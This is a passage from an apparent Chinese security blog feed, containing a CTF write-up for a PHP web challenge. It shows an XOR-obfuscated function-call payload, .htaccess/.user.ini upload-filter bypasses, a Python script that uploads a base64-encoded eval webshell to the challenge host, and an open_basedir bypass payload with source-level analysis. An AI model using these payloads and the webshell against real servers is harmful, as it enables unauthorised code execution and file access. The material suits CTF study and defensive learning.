$string[$k].&quot;\n&quot;;</span><br><span class="line">echo &quot;%&quot;.dechex($a[$i]).&quot;^%&quot;.dechex($a[$j]).&quot;\n&quot;;</span><br><span class="line">$index++;</span><br><span class="line">if($index==strlen($string))&#123;</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">finds(&quot;_GET&quot;);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>即可得到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">G</span><br><span class="line">%86^%c1</span><br><span class="line">E</span><br><span class="line">%86^%c3</span><br><span class="line">T</span><br><span class="line">%86^%d2</span><br><span class="line">_</span><br><span class="line">%86^%d9</span><br></pre></td></tr></table></figure><p>[异或或取反绕过][<a href="https://www.cnblogs.com/cimuhuashuimu/p/11546422.html]">https://www.cnblogs.com/cimuhuashuimu/p/11546422.html]</a></p><p>因此，可以构造payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?_=$&#123;%86%86%86%86^%d9%c1%c3%d2&#125;&#123;%86&#125;();&amp;%86=phpinfo</span><br></pre></td></tr></table></figure><p>然后可以看到php版本得信息，从disable_function中，我们可以看见很多函数被过滤掉了，所以我们可以尝试源码中得get_the_flag()函数，而从get_the_flag()函数中，我们可以知道我们需要上传文件，但是在源码中，我们可以看见</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(preg_match(&quot;/ph/i&quot;,$extension)) die(&quot;^_^&quot;);</span><br></pre></td></tr></table></figure><p>这个if将文件后缀为php、phtml等文件都过滤掉了，而这个if</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(mb_strpos(file_get_contents($tmp_name), &#x27;&lt;?&#x27;)!==False)</span><br></pre></td></tr></table></figure><p>将文件内容有&lt;?的文件给过滤掉了，而这个if</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(!exif_imagetype($tmp_name))</span><br></pre></td></tr></table></figure><p>会检查文件头且限定只能上传image</p><p>而由于这里的php版本太高，所以不可以使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=&quot;php&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>html的格式，所以我们可以利用.user.ini文件或.htaccess文件，</p><h2 id="htaccess文件"><a href="#htaccess文件" class="headerlink" title="htaccess文件"></a>htaccess文件</h2><p>htacess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置</p><p>利用方法一</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;test&quot;&gt;</span><br><span class="line"> </span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line"> </span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><p>通过它调用php解析器去解析文件名，只要文件名中包含”test”这个字符串的任意文件，无论扩展名是什么，都会以php的方式来解析</p><p>利用方法二</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType  application/x-httpd-php    .png</span><br></pre></td></tr></table></figure><p>让.png文件解析为php文件</p><h2 id="user-ini文件"><a href="#user-ini文件" class="headerlink" title=".user.ini文件"></a>.user.ini文件</h2><p>对于.user.ini文件来说，只要是以fastcgi运行的php都可以用这个方法</p><p>利用方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">auto_prepend_file=1.jpg </span><br></pre></td></tr></table></figure><p>所有的php文件执行前都会将1.jpg文件当作是php类型文件先包含执行一遍，这里的GIF89a是文件幻术头进行绕过</p><p>[.htaccess文件以及.user.ini文件][<a href="https://blog.csdn.net/since_2020/article/details/113781120?utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~default-1.no_search_link&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~default-1.no_search_link%5D">https://blog.csdn.net/since_2020/article/details/113781120?utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7Edefault-1.no_search_link&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7Edefault-1.no_search_link]</a></p><p>回到题目本身，由于.user.ini是适用于nginx的，而.htaccess文件是适用于apache服务器，所以看php版本的信息后，我们可以知道这是apache服务器，所以使用.htaccess文件，我们可以将上传文件中的一句话用base64加密，然后在.htaccess中利用php伪协议进行解码，但是如果用GIF89a文件头来绕过文件头检测的话，.htaccess文件会无效，所以我们可以使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#define width 1337</span><br><span class="line">#define height 1337</span><br></pre></td></tr></table></figure><p>由于#在.htaccess文件中是注释符的作用，因此可以绕过文件头检测，所以我们可以上传.htaccess文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#define width 1337</span><br><span class="line">#define height 1337</span><br><span class="line">AddType application/x-httpd-php .ahhh</span><br><span class="line">php_value auto_append_file &quot;php://filter/convert.base64-decode/resource=./shell.ahhh&quot;</span><br></pre></td></tr></table></figure><p>然后上传shell.ahhh文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a12#12是为了补足8个字节，满足base64编码的规则</span><br><span class="line">PD9waHAgZXZhbCgkX1JFUVVFU1RbJ2NtZCddKTs/Pg==</span><br></pre></td></tr></table></figure><p>然后构造上传的exp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">htaccess=b&quot;&quot;&quot;</span><br><span class="line">#define width 1337</span><br><span class="line">#define height 1337</span><br><span class="line">AddType application/x-httpd-php .ahhh</span><br><span class="line">php_value auto_append_file &quot;php://filter/convert.base64-decode/resource=./shell.ahhh&quot;</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">shell=b&quot;GIF89a&quot;+base64.b64encode(b&quot;&lt;?php eval($_REQUEST[&#x27;cmd&#x27;]);?&gt;&quot;)</span><br><span class="line"></span><br><span class="line">url=&quot;http://fe2f819b-9807-4f4b-af87-a202256b7849.node4.buuoj.cn:81/?_=$&#123;%86%86%86%86^%d9%c1%c3%d2&#125;&#123;%86&#125;();&amp;%86=get_the_flag&quot;</span><br><span class="line"></span><br><span class="line">files=&#123;&#x27;file&#x27;:(&#x27;.htaccess&#x27;,htaccess,&#x27;image/jpeg&#x27;)&#125;</span><br><span class="line"></span><br><span class="line">data=&#123;&quot;upload&quot;:&quot;Submit&quot;&#125;</span><br><span class="line">response=requests.post(url=url,data=data,files=files)</span><br><span class="line">print(response.text)</span><br><span class="line"></span><br><span class="line">files=&#123;&#x27;file&#x27;:(&#x27;shell.ahhh&#x27;,shell,&#x27;image/jpeg&#x27;)&#125;</span><br><span class="line">response=requests.post(url=url,data=data,files=files)</span><br><span class="line">print(response.text)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>得到路径</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">upload/tmp_93df0602d768e80cec04f22bc0fb368d/.htaccess</span><br><span class="line">upload/tmp_93df0602d768e80cec04f22bc0fb368d/shell.ahhh</span><br></pre></td></tr></table></figure><p>然后访问shell.ahhh，发现可以访问</p><p>方法一<br>直接用蚁剑连接即可登录后台并得到flag</p><p>方法二</p><p>我们从disable_function中可以知道没有封禁的函数有echo、file_get_contents()、var_dump()和scandir()等，所以我们可以构造</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=var_dump(scandir(&quot;/&quot;));</span><br></pre></td></tr></table></figure><p>来读取目录下的文件，但发现不行，因为在php版本中的open_basedir不可以访问/etc目录，所以我们需要bypass open_basedir</p><h3 id="bypass-open-basedir"><a href="#bypass-open-basedir" class="headerlink" title="bypass open_basedir"></a>bypass open_basedir</h3><h4 id="ini-set覆盖问题"><a href="#ini-set覆盖问题" class="headerlink" title="ini_set覆盖问题"></a>ini_set覆盖问题</h4><p>exp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">var_dump(ini_get(&#x27;open_basedir&#x27;));</span><br><span class="line">ini_set(&#x27;open_basedir&#x27;, &#x27;/tmp&#x27;);</span><br><span class="line">var_dump(ini_get(&#x27;open_basedir&#x27;));</span><br><span class="line">ini_set(&#x27;open_basedir&#x27;, &#x27;/&#x27;);</span><br><span class="line">var_dump(ini_get(&#x27;open_basedir&#x27;));</span><br><span class="line">ini_set(&#x27;open_basedir&#x27;, &#x27;..&#x27;);</span><br><span class="line">var_dump(ini_get(&#x27;open_basedir&#x27;));</span><br></pre></td></tr></table></figure><p>运行后的结果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">string(0) &quot;&quot;</span><br><span class="line">string(4) &quot;/tmp&quot;</span><br><span class="line">string(4) &quot;/tmp&quot;</span><br><span class="line">string(4) &quot;/tmp&quot;</span><br></pre></td></tr></table></figure><p>可以看见open_basedir默认的值是空的，当第一次设置为/tmp后，后面无论怎么设置，都不会对第一次设置的open_basedir的值进行覆盖</p><h5 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h5><p>找到php函数对应的底层函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ini_get：PHP_FUNCTION(ini_get)</span><br><span class="line">ini_set：PHP_FUNCTION(ini_set)</span><br></pre></td></tr></table></figure><p>这里主要看ini_set的流程，因为ini_set是为一个配置选项设置值的，而ini_get是作为信息输出函数</p><p>我们先对ini_set下断点，然后运行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">b /php7.0-src/ext/standard/basic_functions.c 5350</span><br><span class="line">r c.php</span><br></pre></td></tr></table></figure><p>发现有三个初始值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">zend_string *varname;</span><br><span class="line">zend_string *new_value;</span><br><span class="line">char *old_value;</span><br></pre></td></tr></table></figure><p>然后会对我们输入的varname和new_value两个值进行处理，会得到<br>varname.val</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p &amp;varname.val</span><br><span class="line">$46 = (char (*)[1]) 0x7ffff7064978</span><br><span class="line">pwndbg&gt; x/s $46</span><br><span class="line">0x7ffff7064978:&quot;open_basedir&quot;</span><br></pre></td></tr></table></figure><p>new_value.val</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p &amp;new_value.val</span><br><span class="line">$48 = (char (*)[1]) 0x7ffff7058ad8</span><br><span class="line">pwndbg&gt; x/s $48</span><br><span class="line">0x7ffff7058ad8:&quot;/tmp&quot;</span><br></pre></td></tr></table></figure><p>上面都是zend_string的结构体，是php7的新增结构，然后程序会拿到原来的open_basedir的值化为zend_string结构</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p &amp;old_value.val</span><br><span class="line">$48 = (char (*)[1]) 0x8fca0d</span><br><span class="line">pwndbg&gt; x/s $48</span><br><span class="line">0x8fca0d:&quot;/tmp&quot;</span><br></pre></td></tr></table></figure><p>然后会进入php_ini_check_path</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if(PG(open_basedir))&#123;</span><br><span class="line">if(_CHECK_PATH(ZSTR_VAL(varname),ZSTR_LEN(varname),&quot;error_log&quot;) || _CHECK_PATH(ZSTR_VAL(varname),ZSTR_LEN(varname),&quot;java.class.path&quot;) || _CHECK_PATH(ZSTR_VAL(varname),ZSTR_LEN(varname),&quot;java.home&quot;) || _CHECK_PATH(ZSTR_VAL(varname),ZSTR_LEN(varname),&quot;mail.log&quot;) || _CHECK_PATH(ZSTR_VAL(varname),ZSTR_LEN(varname),&quot;java.library.path)||</span><br></pre></td></tr></table></figure><p>由于open_basedir默认为空，所以会跳出判断，进入到下一步</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if (zend_alter_ini_entry_ex(varname, new_value, PHP_INI_USER, PHP_INI_STAGE_RUNTIME, 0) == FAILURE) &#123;</span><br><span class="line">zval_dtor(return_value);</span><br><span class="line">RETURN_FALSE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看见这个if，我们可以看看一下FAILURE的定义</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">typedef enum &#123;</span><br><span class="line">  SUCCESS =  0,</span><br><span class="line">  FAILURE = -1,/* this MUST stay a negative number, or it may affect functions! */</span><br><span class="line">&#125; ZEND_RESULT_CODE;</span><br></pre></td></tr></table></figure><p>发现当zend_alter_ini_entry_ex的返回值不为-1时，则代表成功，否则进入if，返回false，而经过比对，我们可以知道当第一次设置open_basedir和第二次设置open_basedir值时，这里返回的值是不一样的，第一次设置时，这里为SUCCESS，即为0，第二次设置为FAILURE，即为-1，所以我们可以看zend_alter_ini_entry_ex进行比对</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b /php7.0-src/Zend/zend_ini.c:330</span><br></pre></td></tr></table></figure><p>发现两次不同点在于以下判断</p><p>第一次</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if (!ini_entry-&gt;on_modify|| ini_entry-&gt;on_modify(ini_entry, duplicate, ini_entry-&gt;mh_arg1, ini_entry-&gt;mh_arg2, ini_entry-&gt;mh_arg3, stage) == SUCCESS)</span><br></pre></td></tr></table></figure><p>第二次</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ini_entry-&gt;on_modify ：0x5d046e &lt;OnUpdateBaseDir&gt;ini_entry-&gt;on_modify(ini_entry, duplicate, ini_entry-&gt;mh_arg1, ini_entry-&gt;mh_arg2, ini_entry-&gt;mh_arg3, stage) = -1</span><br></pre></td></tr></table></figure><p>发现里面有个on_modify(有关修改)，所以我们可以单步跟进</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PHPAPI ZEND_INI_MH(OnUpdateBaseDir)</span><br></pre></td></tr></table></figure><p>发现是因为进行了以下操作才会在第二次时返回FAILURE</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if (php_check_open_basedir_ex(ptr, 0) != 0) &#123;</span><br><span class="line">/* At least one portion of this open_basedir is less restrictive than the prior one, FAIL */efree(pathbuf);</span><br><span class="line">return FAILURE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>正是因为php_check_open_basedir_ex()没有通过才导致ini_set失败，但是在第一次是通过的，所以如果想要利用ini_set覆盖之前的open_basedir，就要通过这个校验</p><p>所以我们要分析php_check_open_basedir_ex，来bypass php_check_open_basedir_ex</p><p>php_check_open_basedir_ex的源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">if (strlen(path) &gt; (MAXPATHLEN - 1)) &#123;</span><br><span class="line">php_error_docref(NULL, E_WARNING, &quot;File name is longer than the maximum allowed path length on this platform (%d): %s&quot;, MAXPATHLEN, path);</span><br><span class="line">errno = EINVAL;</span><br><span class="line">return -1;</span><br><span class="line">&#125;</span><br><span class="line">#define MAXPATHLEN      PATH_MAX</span><br><span class="line">#define PATH_MAX                 1024   /* max bytes in pathname */</span><br></pre></td></tr></table></figure><p>首先判断路径是否超过1023，然后就是另一个校验函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if (php_check_specific_open_basedir(ptr, path) == 0) &#123;</span><br><span class="line">    efree(pathbuf);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分析php_check_specific_open_basedir函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if (strcmp(basedir, &quot;.&quot;) || !VCWD_GETCWD(local_open_basedir, MAXPATHLEN)) &#123;</span><br><span class="line">/* Else use the unmodified path */</span><br><span class="line">strlcpy(local_open_basedir, basedir, sizeof(local_open_basedir));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>它首先比对了当前目录并赋值给local_open_basedir</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">path_len = strlen(path);</span><br><span class="line">if (path_len &gt; (MAXPATHLEN - 1)) &#123;</span><br><span class="line">    /* empty and too long paths are invalid */</span><br><span class="line">    return -1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后看目录名长度是否合法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if (expand_filepath(path, resolved_name) == NULL) &#123;</span><br><span class="line">return -1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PHPAPI char *expand_filepath(const char *filepath, char *real_path)&#123;</span><br><span class="line">return expand_filepath_ex(filepath, real_path, NULL, 0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后将传入的path，用绝对路径保存在resolved_name中</p><p>然后继续判断</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if (expand_filepath(local_open_basedir, resolved_basedir) != NULL)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">if (strncmp(resolved_basedir, resolved_name, resolved_basedir_len) == 0) </span><br><span class="line">&#123;</span><br><span class="line">    if (resolved_name_len &gt; resolved_basedir_len &amp;&amp; resolved_name[resolved_basedir_len - 1] != PHP_DIR_SEPARATOR) &#123;return -1;&#125; </span><br><span class="line">    else &#123;</span><br><span class="line">/* File is in the right directory */</span><br><span class="line">return 0;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">/* /openbasedir/ and /openbasedir are the same directory */</span><br><span class="line">    if (resolved_basedir_len == (resolved_name_len + 1) &amp;&amp; resolved_basedir[resolved_basedir_len - 1] == PHP_DIR_SEPARATOR) </span><br><span class="line">    &#123;            </span><br><span class="line">        if (strncasecmp(resolved_basedir, resolved_name, resolved_name_len) == 0) </span><br><span class="line">        &#123;</span><br><span class="line">            if (strncmp(resolved_basedir, resolved_name, resolved_name_len) == 0) </span><br><span class="line">            &#123;</span><br><span class="line">                return 0;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return -1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将local_open_basedir的值存放在resolved_basedir中，用于后面比较</p><p>而上面的操作正是匹配路径是否是open_basedir规定路径</p><p>所以我们可以关注可控点expand_filepath()函数，我们可以分析expand_filepath()函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PHPAPI char *expand_filepath(const char *filepath, char *real_path)&#123;</span><br><span class="line">return expand_filepath_ex(filepath, real_path, NULL, 0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再分析expand_filepath_ex()函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if (virtual_file_ex(&amp;new_state, filepath, NULL, realpath_mode)) &#123;efree(new_state.cwd);</span><br><span class="line">return NULL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后再分析virtual_file_ex()函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">if (!IS_ABSOLUTE_PATH(path, path_length)) &#123;</span><br><span class="line">if (state-&gt;cwd_length == 0) &#123;</span><br><span class="line">/* resolve relative path */</span><br><span class="line">start = 0;</span><br><span class="line">memcpy(resolved_path , path, path_length + 1);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">int state_cwd_length = state-&gt;cwd_length;</span><br><span class="line">           ......</span><br><span class="line">        state-&gt;cwd_length = path_length;</span><br><span class="line">           ......</span><br><span class="line">        memcpy(state-&gt;cwd, resolved_path, state-&gt;cwd_length+1);</span><br></pre></td></tr></table></figure><p>上述代码的意思是目录拼接操作，如果path不是绝对路径，同时state-&gt;cwd长度为0，就会直接将path作为绝对路径保存在resolved_path中，否则在state-&gt;cmd后拼接</p><p>因此，我们最后落点在path_length，决定拼接的长度</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">path_length = tsrm_realpath_r(resolved_path, start, path_length, &amp;ll, &amp;t, use_realpath, 0, NULL);</span><br></pre></td></tr></table></figure><p>跟进tsrm_realpath_r，发现path_length操作在</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">remove double slashes and &#x27;.&#x27;</span><br><span class="line">remove &#x27;..&#x27; and previous directory</span><br></pre></td></tr></table></figure><p>所以expand_filepath()函数主要关注相对路径和绝对路径，但是没有关注相对路径的实时变化</p><h4 id="整体思路"><a href="#整体思路" class="headerlink" title="整体思路"></a>整体思路</h4><p>但open_basedir第一次设置后，再次设置是不被允许的，但是由于没有考虑open_basedir为相对路径的实时变化，所以当当前目录是相对路径，而不是绝对路径时，就会触发expand_filekpath()函数漏洞，会将当前目录，即相对路径，存储到resolve_path中，从而绕过检验php_check_open_basedir_ex函数的检验，从而可以更改open_basedir的值，当我们ini.set(‘open_basedir’,’…’)时，只要我们跳转一次，open_basedir的目录也会跳转一次，并将当前的目录存储在resolve_path中，从而可以让我们绕过open_basedir的限制，可以访问根目录</p><p>回到题目本身，我们可以先跳转到open_basedir中的目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chdir(&#x27;/tmp&#x27;)</span><br></pre></td></tr></table></figure><p>然后在open_basedir目录下建立新目录，然后跳转到新目录下，此时为相对路径，所以我们可以重置open_basedir，即</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ini_set(&#x27;open_basedir&#x27;,&#x27;..&#x27;)</span><br></pre></td></tr></table></figure><p>然后一直是使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chdir(&#x27;..&#x27;)</span><br></pre></td></tr></table></figure><p>跳转，此时open_basedir也一直跳转，最后跳转到根目录后，重置open_basedir</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ini_set(&#x27;open_basedir&#x27;,&#x27;\&#x27;)</span><br></pre></td></tr></table></figure><p>即可读取根目录下的文件，因此构造payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?cmd=chdir(&#x27;img&#x27;);mkdir(&#x27;shiwang&#x27;);chdir(&#x27;shiwang&#x27;);ini_set(&#x27;open_basedir&#x27;,&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);ini_set(&#x27;open_basedir&#x27;,&#x27;/&#x27;);echo(file_get_contents(&#x27;/THis_Is_tHe_F14g&#x27;));</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>参考文章：[<a href="https://blog.51cto.com/u_15127538/2702757]">https://blog.51cto.com/u_15127538/2702757]</a></p><pre><code> [https://blog.csdn.net/qq_42967398/article/details/105615235]</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;异或绕过以及文件上传之-htaccess文件以及open-basedir绕过&quot;&gt;&lt;a href=&quot;#异或绕过以及文件上传之-htaccess文件以及open-basedir绕过&quot; class=&quot;headerlink&quot; title=&quot;异或绕过以及文件上传之.htac</summary>
      
    
    
    
    
    <category term="代码审计" scheme="http://example.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>简单的cookie伪造</title>
    <link href="http://example.com/2021/10/03/%E7%AE%80%E5%8D%95%E7%9A%84cookie%E4%BC%AA%E9%80%A0/"/>
    <id>http://example.com/2021/10/03/%E7%AE%80%E5%8D%95%E7%9A%84cookie%E4%BC%AA%E9%80%A0/</id>
    <published>2021-10-02T16:00:00.000Z</published>
    <updated>2021-10-03T17:31:20.901Z</updated>
    
